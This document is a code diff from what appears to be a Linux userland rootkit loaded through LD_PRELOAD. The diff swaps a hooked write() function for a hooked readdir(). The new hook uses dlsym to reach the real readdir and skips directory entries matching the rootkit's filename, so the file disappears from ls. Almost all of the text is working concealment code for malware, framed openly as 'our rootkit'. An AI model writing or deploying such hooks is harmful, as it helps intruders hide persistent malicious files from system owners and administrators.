@@ -32,30 +32,34 @@ void *malloc(size_t size)
 
 //omit our rootkit from the output of ls
 //function pointer to the original write, initialized to NULL
-ssize_t (*original_write)(int fd, const void *buf, size_t bytes) = NULL;
+/** dirent structure
+* struct dirent {
+*               ino_t          d_ino;       / Inode number /
+*               off_t          d_off;       / Not an offset; see below /
+*               unsigned short d_reclen;    / Length of this record /
+*               unsigned char  d_type;      / Type of file; not supported
+*                                              by all filesystem types /
+*               char           d_name[256]; / Null-terminated filename /
+*           };
+**/
 
-//hook for write
-ssize_t write(int fd, const void *buf, size_t bytes)
+//function pointer to the original readdir
+struct dirent* (*original_readdir)(DIR *) = NULL;
+
+struct dirent *readdir(DIR *dirp)
 {
-    if (original_write == NULL)
+    if (original_readdir == NULL)
     {
-        //find the address of the next occurence of "write"
-        original_write = dlsym(RTLD_NEXT, "write");
+        //finds the offset of the next occurence of readdir
+        original_readdir = dlsym(RTLD_NEXT, "readdir");
     }
 
-    //see if the name of our rootkit is in the buffer
-    size_t len = strlen(FILENAME);
-    char *rootkit_found = strstr(buf, FILENAME);
-    char *new_output = (char *) malloc(strlen(buf) - len);
-
-    if (rootkit_found != NULL)
+    struct dirent *results = original_readdir(dirp);
+    while (results != NULL && !strncmp(results->d_name, FILENAME, strlen(FILENAME)))
     {
-        memcpy(new_output, buf, (rootkit_found - (char *) buf));
-        memcpy(new_output + (rootkit_found - (char *) buf), rootkit_found + len, strlen(buf) - len);
+        //move onto the next entry in the stream
+        results = original_readdir(dirp);
     }
 
-    ssize_t write_output = 0;
-    write_output = original_write(fd, new_output, bytes);
-
-    return write_output; 
+    return results;
 }
